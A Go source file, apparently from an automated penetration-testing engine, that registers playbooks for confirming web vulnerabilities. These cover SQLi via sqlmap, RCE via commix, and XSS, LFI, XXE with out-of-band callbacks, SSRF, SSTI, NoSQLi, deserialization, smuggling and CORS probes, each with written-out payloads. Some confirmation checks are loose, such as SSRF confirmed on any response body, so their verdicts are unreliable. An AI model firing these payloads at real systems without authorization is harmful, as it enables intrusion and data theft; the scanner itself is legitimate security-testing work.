package ttp

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"

	"github.com/ares/engine/internal/security"
)

var verifyTimeout = 5 * time.Minute

var httpClient = &http.Client{Timeout: 15 * time.Second}

type VerificationResult struct {
	VulnClass    string
	Confirmed    bool
	Confidence   float64
	Evidence     string
	Reproduction string
	Remediation  string
	CVSSScore    float64
	Severity     string
	Timestamp    time.Time
	ToolUsed     string
	RawOutput    string
}

type Playbook struct {
	Class       string
	Name        string
	Description string
	VerifyFn    func(target string, evidence map[string]string) *VerificationResult
	CVSSBase    float64
	Severity    string
	Remediation string
}

type Registry struct {
	playbooks map[string]*Playbook
}

func NewRegistry() *Registry {
	r := &Registry{playbooks: make(map[string]*Playbook)}
	r.registerBuiltins()
	return r
}

func (r *Registry) Register(p *Playbook) {
	r.playbooks[p.Class] = p
}

func (r *Registry) Get(class string) (*Playbook, bool) {
	p, ok := r.playbooks[class]
	return p, ok
}

func (r *Registry) List() []string {
	var out []string
	for k := range r.playbooks {
		out = append(out, k)
	}
	return out
}

func (r *Registry) Verify(vulnClass, target string, evidence map[string]string) *VerificationResult {
	pb, ok := r.playbooks[vulnClass]
	if !ok {
		return &VerificationResult{
			VulnClass:  vulnClass,
			Confirmed:  false,
			Confidence: 0,
			Evidence:   fmt.Sprintf("No TTP playbook registered for '%s'", vulnClass),
			Timestamp:  time.Now(),
		}
	}
	return pb.VerifyFn(target, evidence)
}

func IsConfirmed(results []*VerificationResult) bool {
	confirmedCount := 0
	for _, r := range results {
		if r != nil && r.Confirmed {
			confirmedCount++
		}
	}
	return confirmedCount >= 2
}

func SystemPromptSection(target string) string {
	return "[TTP Verification] Use TTP playbooks to independently confirm findings.\n"
}

func (r *Registry) registerBuiltins() {
	r.Register(&Playbook{
		Class: "sqli", Name: "SQL Injection Verification",
		Description: "Confirm SQLi with sqlmap --technique=T timing test",
		CVSSBase:    8.5, Severity: "high",
		Remediation: "Use parameterized queries/prepared statements.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			safeTarget, err := sanitizeURL(target)
			if err != nil {
				return &VerificationResult{VulnClass: "sqli", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			spec := security.CommandSpec{Binary: "sqlmap", Args: []string{"-u", safeTarget, "--", "--batch", "--technique=T", "--time-sec=5", "--timeout=30", "-q"}}
			validated := security.ValidateCommand(spec)
			if validated.Err != nil {
				return &VerificationResult{VulnClass: "sqli", Confirmed: false, Confidence: 0, Evidence: validated.Err.Error()}
			}
			vreq := security.ActionRequest{Type: security.ActionShellExec, Binary: validated.Binary, Args: validated.Args, Source: "ttp/sqli"}
			if verdict := security.GetK().ValidateAction(context.Background(), vreq); verdict.Decision != security.DecisionAllow {
				return &VerificationResult{VulnClass: "sqli", Confirmed: false, Confidence: 0, Evidence: fmt.Sprintf("kernel denied: %s", verdict.Reason)}
			}
			ctx, cancel := context.WithTimeout(context.Background(), verifyTimeout)
			defer cancel()
			cmd := exec.CommandContext(ctx, validated.Binary, validated.Args...)
			out, err := cmd.CombinedOutput()
			if err != nil {
				return &VerificationResult{VulnClass: "sqli", Confirmed: false, Confidence: 0, Evidence: fmt.Sprintf("sqlmap execution failed: %v", err)}
			}
			output := string(out)
			confirmed := strings.Contains(output, "sqlmap identified") || strings.Contains(output, "fetched data")
			return &VerificationResult{
				VulnClass: "sqli", Confirmed: confirmed, Confidence: 0.95,
				Evidence:     extractSection(output, "sqlmap identified", 400),
				Reproduction: fmt.Sprintf("sqlmap -u %s --batch --technique=T", target),
				ToolUsed:     "sqlmap", RawOutput: truncate(output, 800), Timestamp: time.Now(),
			}
		},
	})
	r.Register(&Playbook{
		Class: "xss", Name: "Cross-Site Scripting Verification",
		Description: "Confirm XSS by checking for payload reflection",
		CVSSBase:    6.8, Severity: "medium",
		Remediation: "Implement context-aware output encoding. Use CSP headers.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			payload := evidence["payload"]
			if payload == "" {
				payload = "<script>alert(1)</script>"
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "xss", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			resp, err := httpClient.Get(target)
			confirmed := false
			var body string
			if err == nil {
				defer resp.Body.Close()
				b := make([]byte, 8192)
				n, err := resp.Body.Read(b)
				if err != nil && err != io.EOF {
				}
				body = string(b[:n])
				confirmed = strings.Contains(body, payload) || strings.Contains(body, "alert(1)")
			}
			return &VerificationResult{
				VulnClass: "xss", Confirmed: confirmed, Confidence: 0.85,
				Evidence:     fmt.Sprintf("Payload reflection: %v", confirmed),
				Reproduction: fmt.Sprintf("curl -s %s | grep '%s'", target, payload),
				ToolUsed:     "curl", RawOutput: truncate(body, 600), Timestamp: time.Now(),
			}
		},
	})
	r.Register(&Playbook{
		Class: "lfi", Name: "Local File Inclusion Verification",
		Description: "Confirm LFI by requesting /etc/passwd",
		CVSSBase:    7.5, Severity: "high",
		Remediation: "Use file allowlists. Avoid user-controlled file paths.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			payload := "../../../etc/passwd"
			if strings.Contains(target, "=") {
				parts := strings.SplitN(target, "=", 2)
				target = parts[0] + "=" + url.QueryEscape(payload)
			} else {
				target = strings.TrimRight(target, "/") + "/" + payload
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "lfi", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			resp, err := httpClient.Get(target)
			confirmed := false
			var body string
			if err == nil {
				defer resp.Body.Close()
				b := make([]byte, 8192)
				n, err := resp.Body.Read(b)
				if err != nil && err != io.EOF {
				}
				body = string(b[:n])
				confirmed = strings.Contains(body, "root:x:0")
			}
			return &VerificationResult{
				VulnClass: "lfi", Confirmed: confirmed, Confidence: 0.90,
				Evidence:     truncate(body, 400),
				Reproduction: fmt.Sprintf("curl -s '%s'", target),
				ToolUsed:     "curl", RawOutput: truncate(body, 600), Timestamp: time.Now(),
			}
		},
	})
	r.Register(&Playbook{
		Class: "rce", Name: "Remote Code Execution Verification",
		Description: "Confirm RCE by executing benign command",
		CVSSBase:    9.8, Severity: "critical",
		Remediation: "Avoid eval/exec on user input. Use sandboxing.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			safeTarget, err := sanitizeURL(target)
			if err != nil {
				return &VerificationResult{VulnClass: "rce", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			spec := security.CommandSpec{Binary: "commix", Args: []string{"--url", safeTarget, "--", "--batch", "--level=2", "--timeout=20"}}
			validated := security.ValidateCommand(spec)
			if validated.Err != nil {
				return &VerificationResult{VulnClass: "rce", Confirmed: false, Confidence: 0, Evidence: validated.Err.Error()}
			}
			vreq := security.ActionRequest{Type: security.ActionShellExec, Binary: validated.Binary, Args: validated.Args, Source: "ttp/rce"}
			if verdict := security.GetK().ValidateAction(context.Background(), vreq); verdict.Decision != security.DecisionAllow {
				return &VerificationResult{VulnClass: "rce", Confirmed: false, Confidence: 0, Evidence: fmt.Sprintf("kernel denied: %s", verdict.Reason)}
			}
			ctx, cancel := context.WithTimeout(context.Background(), verifyTimeout)
			defer cancel()
			cmd := exec.CommandContext(ctx, validated.Binary, validated.Args...)
			out, err := cmd.CombinedOutput()
			if err != nil {
				return &VerificationResult{VulnClass: "rce", Confirmed: false, Confidence: 0, Evidence: fmt.Sprintf("commix execution failed: %v", err)}
			}
			output := string(out)
			confirmed := strings.Contains(output, "command injection") || strings.Contains(output, "shell")
			return &VerificationResult{
				VulnClass: "rce", Confirmed: confirmed, Confidence: 0.90,
				Evidence:     extractSection(output, "command injection", 400),
				Reproduction: fmt.Sprintf("commix --url %s --batch --level=2", target),
				ToolUsed:     "commix", RawOutput: truncate(output, 800), Timestamp: time.Now(),
			}
		},
	})
	r.Register(&Playbook{
		Class: "ssrf", Name: "Server-Side Request Forgery Verification",
		Description: "Confirm SSRF via out-of-band callback",
		CVSSBase:    7.5, Severity: "high",
		Remediation: "Use URL allowlists. Disable unnecessary URL schemas.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			oobDomain := evidence["oob_domain"]
			if oobDomain == "" {
				return &VerificationResult{
					VulnClass: "ssrf", Confirmed: false, Confidence: 0.0,
					Evidence:     "no OOB domain configured for SSRF verification",
					Reproduction: fmt.Sprintf("curl -d '{\"url\":\"http://your-oob-domain/\"}' %s", target),
					ToolUsed:     "curl", RawOutput: "", Timestamp: time.Now(),
				}
			}
			if !strings.HasPrefix(oobDomain, "http://") && !strings.HasPrefix(oobDomain, "https://") {
				oobDomain = "http://" + oobDomain
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "ssrf", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			reqBody := fmt.Sprintf(`{"url":"%s"}`, oobDomain)
			resp, err := httpClient.Post(target, "application/json", strings.NewReader(reqBody))
			confirmed := false
			var body string
			if err == nil {
				defer resp.Body.Close()
				b := make([]byte, 8192)
				n, err := resp.Body.Read(b)
				if err != nil && err != io.EOF {
				}
				body = string(b[:n])
				confirmed = len(body) > 0
			}
			return &VerificationResult{
				VulnClass: "ssrf", Confirmed: confirmed, Confidence: 0.80,
				Evidence:     truncate(body, 400),
				Reproduction: fmt.Sprintf("curl -d '{\"url\":\"%s\"}' %s", oobDomain, target),
				ToolUsed:     "curl", RawOutput: truncate(body, 600), Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "idor", Name: "Insecure Direct Object Reference Verification",
		Description: "Confirm IDOR by accessing another user's resource with modified ID",
		CVSSBase:    7.5, Severity: "high",
		Remediation: "Implement proper authorization checks on all object references. Use indirect reference maps.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			originalID := evidence["original_id"]
			altID := evidence["alternate_id"]
			if originalID == "" || altID == "" {
				return &VerificationResult{
					VulnClass: "idor", Confirmed: false, Confidence: 0,
					Evidence: "original_id and alternate_id required for IDOR verification",
				}
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "idor", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			targetAlt := strings.Replace(target, originalID, altID, 1)
			resp1, err1 := httpClient.Get(target)
			resp2, err2 := httpClient.Get(targetAlt)
			confirmed := false
			if err1 == nil && err2 == nil {
				defer resp1.Body.Close()
				defer resp2.Body.Close()
				b1, _ := io.ReadAll(io.LimitReader(resp1.Body, 4096))
				b2, _ := io.ReadAll(io.LimitReader(resp2.Body, 4096))
				if resp1.StatusCode == 200 && resp2.StatusCode == 200 && string(b1) != string(b2) {
					confirmed = true
				}
			}
			return &VerificationResult{
				VulnClass: "idor", Confirmed: confirmed, Confidence: 0.85,
				Evidence:     fmt.Sprintf("ID %s returned different data than ID %s (both 200)", originalID, altID),
				Reproduction: fmt.Sprintf("curl %s vs curl %s", target, targetAlt),
				Remediation:  "Implement proper authorization checks on all object references.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "xxe", Name: "XML External Entity Verification",
		Description: "Confirm XXE by checking for OOB callback or data exfiltration",
		CVSSBase:    9.1, Severity: "critical",
		Remediation: "Disable external entity processing in XML parsers. Use JSON instead of XML.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			oobDomain := evidence["oob_domain"]
			if oobDomain == "" {
				return &VerificationResult{
					VulnClass: "xxe", Confirmed: false, Confidence: 0,
					Evidence: "no OOB domain configured for XXE verification",
				}
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "xxe", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			xxePayload := fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s/xxe">]><foo>&xxe;</foo>`, oobDomain)
			resp, err := httpClient.Post(target, "application/xml", strings.NewReader(xxePayload))
			confirmed := false
			if err == nil {
				defer resp.Body.Close()
				b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
				confirmed = resp.StatusCode == 500 || strings.Contains(string(b), "parser") || strings.Contains(string(b), "entity")
			}
			return &VerificationResult{
				VulnClass: "xxe", Confirmed: confirmed, Confidence: 0.80,
				Evidence:     fmt.Sprintf("XXE payload sent, response status: %v", confirmed),
				Reproduction: fmt.Sprintf("curl -X POST -H 'Content-Type: application/xml' -d '%s' %s", xxePayload, target),
				Remediation:  "Disable external entity processing in XML parsers.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "ssti", Name: "Server-Side Template Injection Verification",
		Description: "Confirm SSTI by checking for template expression evaluation",
		CVSSBase:    8.6, Severity: "high",
		Remediation: "Use logic-less templates. Sanitize user input before template rendering.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			payload := evidence["payload"]
			if payload == "" {
				payload = "{{7*7}}"
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "ssti", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			targetWithPayload := target
			if strings.Contains(target, "=") {
				parts := strings.SplitN(target, "=", 2)
				targetWithPayload = parts[0] + "=" + url.QueryEscape(payload)
			} else {
				targetWithPayload = strings.TrimRight(target, "/") + "/" + url.QueryEscape(payload)
			}
			resp, err := httpClient.Get(targetWithPayload)
			confirmed := false
			var body string
			if err == nil {
				defer resp.Body.Close()
				b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
				body = string(b)
				confirmed = strings.Contains(body, "49") && !strings.Contains(body, "7*7")
			}
			return &VerificationResult{
				VulnClass: "ssti", Confirmed: confirmed, Confidence: 0.85,
				Evidence:     fmt.Sprintf("Template expression evaluated: %v", confirmed),
				Reproduction: fmt.Sprintf("curl '%s'", targetWithPayload),
				Remediation:  "Use logic-less templates. Sanitize user input before template rendering.",
				ToolUsed:     "curl", RawOutput: truncate(body, 600), Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "nosqli", Name: "NoSQL Injection Verification",
		Description: "Confirm NoSQLi by checking for MongoDB/NoSQL operator injection",
		CVSSBase:    8.0, Severity: "high",
		Remediation: "Use parameterized queries. Validate and sanitize all user input.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			payload := evidence["payload"]
			if payload == "" {
				payload = `{"$gt":""}`
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "nosqli", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			resp, err := httpClient.Post(target, "application/json", strings.NewReader(payload))
			confirmed := false
			var body string
			if err == nil {
				defer resp.Body.Close()
				b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
				body = string(b)
				confirmed = resp.StatusCode == 200 && (strings.Contains(body, "error") || strings.Contains(body, "Mongo") || strings.Contains(body, "CastError"))
			}
			return &VerificationResult{
				VulnClass: "nosqli", Confirmed: confirmed, Confidence: 0.80,
				Evidence:     fmt.Sprintf("NoSQL operator injection response: %v", confirmed),
				Reproduction: fmt.Sprintf("curl -X POST -H 'Content-Type: application/json' -d '%s' %s", payload, target),
				Remediation:  "Use parameterized queries. Validate and sanitize all user input.",
				ToolUsed:     "curl", RawOutput: truncate(body, 600), Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "deserialization", Name: "Insecure Deserialization Verification",
		Description: "Confirm deserialization vulnerability by checking for gadget chain execution",
		CVSSBase:    9.8, Severity: "critical",
		Remediation: "Avoid deserializing untrusted data. Use allowlists for expected classes.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			oobDomain := evidence["oob_domain"]
			if oobDomain == "" {
				return &VerificationResult{
					VulnClass: "deserialization", Confirmed: false, Confidence: 0,
					Evidence: "no OOB domain configured for deserialization verification",
				}
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "deserialization", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			javaPayload := `rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QHN5bWFudGljcy5vYm90by54bWwuZXZhbC5FeHByZXNzaW9uRmFjdG9yeXQACGdldE9iamVjdHg=`
			resp, err := httpClient.Post(target, "application/octet-stream", strings.NewReader(javaPayload))
			confirmed := false
			if err == nil {
				defer resp.Body.Close()
				b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
				body := string(b)
				confirmed = resp.StatusCode == 500 || strings.Contains(body, "Exception") || strings.Contains(body, "Error")
			}
			return &VerificationResult{
				VulnClass: "deserialization", Confirmed: confirmed, Confidence: 0.75,
				Evidence:     fmt.Sprintf("Deserialization payload triggered error: %v", confirmed),
				Reproduction: fmt.Sprintf("curl -X POST -H 'Content-Type: application/octet-stream' --data-binary @payload.ser %s", target),
				Remediation:  "Avoid deserializing untrusted data. Use allowlists for expected classes.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "open_redirect", Name: "Open Redirect Verification",
		Description: "Confirm open redirect by checking if arbitrary URL redirection is possible",
		CVSSBase:    4.7, Severity: "low",
		Remediation: "Use allowlists for redirect targets. Avoid user-controlled redirect parameters.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			redirectURL := evidence["redirect_url"]
			if redirectURL == "" {
				redirectURL = "https://example.com"
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "open_redirect", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			targetWithRedirect := target
			if strings.Contains(target, "=") {
				parts := strings.SplitN(target, "=", 2)
				targetWithRedirect = parts[0] + "=" + url.QueryEscape(redirectURL)
			} else {
				targetWithRedirect = strings.TrimRight(target, "/") + "/?url=" + url.QueryEscape(redirectURL)
			}
			client := &http.Client{
				Timeout: 15 * time.Second,
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
				Transport: &http.Transport{
					MaxIdleConns:    10,
					MaxConnsPerHost: 5,
					IdleConnTimeout: 90 * time.Second,
				},
			}
			resp, err := client.Get(targetWithRedirect)
			confirmed := false
			if err == nil {
				defer resp.Body.Close()
				location := resp.Header.Get("Location")
				confirmed = (resp.StatusCode == 301 || resp.StatusCode == 302) && strings.Contains(location, redirectURL)
			}
			return &VerificationResult{
				VulnClass: "open_redirect", Confirmed: confirmed, Confidence: 0.90,
				Evidence:     fmt.Sprintf("Redirect to %s: %v", redirectURL, confirmed),
				Reproduction: fmt.Sprintf("curl -I '%s'", targetWithRedirect),
				Remediation:  "Use allowlists for redirect targets.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "csrf", Name: "Cross-Site Request Forgery Verification",
		Description: "Confirm CSRF by checking if state-changing requests work without CSRF token",
		CVSSBase:    6.5, Severity: "medium",
		Remediation: "Implement CSRF tokens for all state-changing operations. Use SameSite cookie attribute.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "csrf", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			req, err := http.NewRequest("POST", target, strings.NewReader("action=test"))
			if err != nil {
				return &VerificationResult{VulnClass: "csrf", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			resp, err := httpClient.Do(req)
			confirmed := false
			if err == nil {
				defer resp.Body.Close()
				confirmed = resp.StatusCode == 200 || resp.StatusCode == 201
			}
			return &VerificationResult{
				VulnClass: "csrf", Confirmed: confirmed, Confidence: 0.70,
				Evidence:     fmt.Sprintf("POST without CSRF token succeeded: %v", confirmed),
				Reproduction: fmt.Sprintf("curl -X POST -d 'action=test' %s", target),
				Remediation:  "Implement CSRF tokens for all state-changing operations.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "race_conditions", Name: "Race Condition Verification",
		Description: "Confirm race condition by sending concurrent requests",
		CVSSBase:    7.5, Severity: "high",
		Remediation: "Use database transactions or locks for critical operations.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "race_conditions", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			concurrent := 10
			results := make(chan *http.Response, concurrent)
			for i := 0; i < concurrent; i++ {
				go func() {
					resp, err := httpClient.Post(target, "application/json", strings.NewReader(`{"action":"test"}`))
					if err != nil {
						results <- nil
						return
					}
					results <- resp
				}()
			}
			successCount := 0
			for i := 0; i < concurrent; i++ {
				resp := <-results
				if resp != nil && resp.StatusCode == 200 {
					successCount++
					resp.Body.Close()
				}
			}
			confirmed := successCount > 1
			return &VerificationResult{
				VulnClass: "race_conditions", Confirmed: confirmed, Confidence: 0.75,
				Evidence:     fmt.Sprintf("%d/%d concurrent requests succeeded", successCount, concurrent),
				Reproduction: fmt.Sprintf("Send %d concurrent POST requests to %s", concurrent, target),
				Remediation:  "Use database transactions or locks for critical operations.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "jwt_weak", Name: "Weak JWT Verification",
		Description: "Confirm weak JWT by checking for algorithm confusion or weak secrets",
		CVSSBase:    7.0, Severity: "high",
		Remediation: "Use strong signing algorithms (RS256). Enforce secret key complexity.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			token := evidence["jwt_token"]
			if token == "" {
				return &VerificationResult{
					VulnClass: "jwt_weak", Confirmed: false, Confidence: 0,
					Evidence: "jwt_token required for verification",
				}
			}
			parts := strings.Split(token, ".")
			if len(parts) != 3 {
				return &VerificationResult{VulnClass: "jwt_weak", Confirmed: false, Confidence: 0, Evidence: "invalid JWT format"}
			}
			confirmed := strings.Contains(parts[0], "none") || strings.Contains(parts[0], "HS256")
			return &VerificationResult{
				VulnClass: "jwt_weak", Confirmed: confirmed, Confidence: 0.80,
				Evidence:     fmt.Sprintf("JWT algorithm check: %v", confirmed),
				Reproduction: "Decode JWT header and check algorithm",
				Remediation:  "Use strong signing algorithms (RS256).",
				ToolUsed:     "manual", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "prototype_pollution", Name: "Prototype Pollution Verification",
		Description: "Confirm prototype pollution by checking for object prototype modification",
		CVSSBase:    7.3, Severity: "high",
		Remediation: "Use Object.create(null) for dictionaries. Freeze object prototypes.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			payload := evidence["payload"]
			if payload == "" {
				payload = `{"__proto__":{"polluted":"yes"}}`
			}
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "prototype_pollution", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			resp, err := httpClient.Post(target, "application/json", strings.NewReader(payload))
			confirmed := false
			var body string
			if err == nil {
				defer resp.Body.Close()
				b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
				body = string(b)
				confirmed = strings.Contains(body, "polluted") || resp.StatusCode == 500
			}
			return &VerificationResult{
				VulnClass: "prototype_pollution", Confirmed: confirmed, Confidence: 0.75,
				Evidence:     fmt.Sprintf("Prototype pollution payload response: %v", confirmed),
				Reproduction: fmt.Sprintf("curl -X POST -H 'Content-Type: application/json' -d '%s' %s", payload, target),
				Remediation:  "Use Object.create(null) for dictionaries.",
				ToolUsed:     "curl", RawOutput: truncate(body, 600), Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "graphql", Name: "GraphQL Injection Verification",
		Description: "Confirm GraphQL injection by checking for introspection or query manipulation",
		CVSSBase:    7.5, Severity: "high",
		Remediation: "Disable introspection in production. Implement query complexity limits.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			introspectionQuery := `{"query":"{__schema{types{name fields{name}}}}"}`
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "graphql", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			resp, err := httpClient.Post(target, "application/json", strings.NewReader(introspectionQuery))
			confirmed := false
			var body string
			if err == nil {
				defer resp.Body.Close()
				b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
				body = string(b)
				confirmed = resp.StatusCode == 200 && strings.Contains(body, "__schema")
			}
			return &VerificationResult{
				VulnClass: "graphql", Confirmed: confirmed, Confidence: 0.85,
				Evidence:     fmt.Sprintf("GraphQL introspection enabled: %v", confirmed),
				Reproduction: fmt.Sprintf("curl -X POST -H 'Content-Type: application/json' -d '%s' %s", introspectionQuery, target),
				Remediation:  "Disable introspection in production.",
				ToolUsed:     "curl", RawOutput: truncate(body, 600), Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "blind_sqli", Name: "Blind SQL Injection Verification",
		Description: "Confirm blind SQLi by checking for time-based or boolean-based differences",
		CVSSBase:    8.5, Severity: "high",
		Remediation: "Use parameterized queries. Implement input validation.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "blind_sqli", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			start := time.Now()
			timePayload := target + "' OR SLEEP(5)--"
			if strings.Contains(target, "?") {
				timePayload = target + "' OR SLEEP(5)--"
			}
			resp, err := httpClient.Get(timePayload)
			elapsed := time.Since(start)
			confirmed := false
			if err == nil {
				defer resp.Body.Close()
				confirmed = elapsed > 4*time.Second
			}
			return &VerificationResult{
				VulnClass: "blind_sqli", Confirmed: confirmed, Confidence: 0.85,
				Evidence:     fmt.Sprintf("Time-based blind SQLi: %v (elapsed: %v)", confirmed, elapsed),
				Reproduction: fmt.Sprintf("curl '%s'", timePayload),
				Remediation:  "Use parameterized queries.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "smuggling", Name: "HTTP Request Smuggling Verification",
		Description: "Confirm HTTP smuggling by checking for CL.TE or TE.CL discrepancies",
		CVSSBase:    7.5, Severity: "high",
		Remediation: "Use consistent HTTP parsers. Enable HTTP/2 end-to-end.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "smuggling", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			req, err := http.NewRequest("POST", target, strings.NewReader("0\r\n\r\nG"))
			if err != nil {
				return &VerificationResult{VulnClass: "smuggling", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			req.Header.Set("Transfer-Encoding", "chunked")
			req.Header.Set("Content-Length", "4")
			resp, err := httpClient.Do(req)
			confirmed := false
			if err == nil {
				defer resp.Body.Close()
				confirmed = resp.StatusCode == 400 || resp.StatusCode == 500
			}
			return &VerificationResult{
				VulnClass: "smuggling", Confirmed: confirmed, Confidence: 0.70,
				Evidence:     fmt.Sprintf("HTTP smuggling probe response: %v", confirmed),
				Reproduction: "Send malformed CL.TE request",
				Remediation:  "Use consistent HTTP parsers.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "cors", Name: "CORS Misconfiguration Verification",
		Description: "Confirm CORS misconfiguration by checking for overly permissive Access-Control headers",
		CVSSBase:    6.5, Severity: "medium",
		Remediation: "Restrict Access-Control-Allow-Origin to specific domains. Avoid wildcard origins.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "cors", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			req, err := http.NewRequest("GET", target, nil)
			if err != nil {
				return &VerificationResult{VulnClass: "cors", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			req.Header.Set("Origin", "https://evil.com")
			resp, err := httpClient.Do(req)
			confirmed := false
			if err == nil {
				defer resp.Body.Close()
				acao := resp.Header.Get("Access-Control-Allow-Origin")
				confirmed = acao == "*" || acao == "https://evil.com"
			}
			return &VerificationResult{
				VulnClass: "cors", Confirmed: confirmed, Confidence: 0.90,
				Evidence:     fmt.Sprintf("CORS allows evil.com: %v", confirmed),
				Reproduction: fmt.Sprintf("curl -H 'Origin: https://evil.com' -I %s", target),
				Remediation:  "Restrict Access-Control-Allow-Origin to specific domains.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})

	r.Register(&Playbook{
		Class: "api_abuse", Name: "API Abuse Verification",
		Description: "Confirm API abuse potential by checking for rate limiting and input validation",
		CVSSBase:    5.3, Severity: "medium",
		Remediation: "Implement rate limiting. Validate all input parameters.",
		VerifyFn: func(target string, evidence map[string]string) *VerificationResult {
			if err := security.ValidateURL(target); err != nil {
				return &VerificationResult{VulnClass: "api_abuse", Confirmed: false, Confidence: 0, Evidence: err.Error()}
			}
			rateLimited := false
			for i := 0; i < 20; i++ {
				resp, err := httpClient.Get(target)
				if err == nil {
					if resp.StatusCode == 429 {
						rateLimited = true
					}
					resp.Body.Close()
				}
			}
			confirmed := !rateLimited
			return &VerificationResult{
				VulnClass: "api_abuse", Confirmed: confirmed, Confidence: 0.75,
				Evidence:     fmt.Sprintf("No rate limiting detected: %v", confirmed),
				Reproduction: "Send 20 rapid requests and check for 429",
				Remediation:  "Implement rate limiting.",
				ToolUsed:     "curl", Timestamp: time.Now(),
			}
		},
	})
}

func sanitizeURL(rawURL string) (string, error) {
	if rawURL == "" {
		return "", fmt.Errorf("empty URL")
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return "", fmt.Errorf("invalid URL: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return "", fmt.Errorf("unsupported URL scheme: %s", u.Scheme)
	}
